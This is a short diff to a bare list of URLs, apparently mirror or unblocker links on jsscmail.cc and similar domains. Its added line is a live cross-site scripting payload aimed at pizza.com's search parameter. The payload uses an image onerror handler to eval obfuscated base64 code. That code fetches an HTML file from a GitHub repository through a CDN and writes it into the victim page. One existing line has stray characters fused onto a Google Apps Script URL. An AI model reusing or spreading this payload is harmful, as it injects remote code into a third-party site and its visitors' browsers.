@@ -3,7 +3,7 @@ https://passwords.jsscmail.cc/
 https://inbox.jsscmail.cc/
 https://math.jsscmail.cc/
 
-
+https://pizza.com/?s=<img%20src%20onerror=e%3Deval,e(atob('ZmV0Y2goJ2h0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9nYWxheHlraW5nMTYvbGVhcm5AbWFpbi9kYXRhLmh0bWwnKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKHQ9PmRvY3VtZW50LndyaXRlKHQpKQ'))>
 hiwytrrhyhihttps://script.google.com/macros/s/AKfycbw-9Y0SkbAhSVLBK8u5bVqhwYXqU1enIElKPM6AZyVig_q__c4hKzQX8TmfbUpvLwv2/exec
 
 https://gf6l4ah4.betterthancbmagic.life/
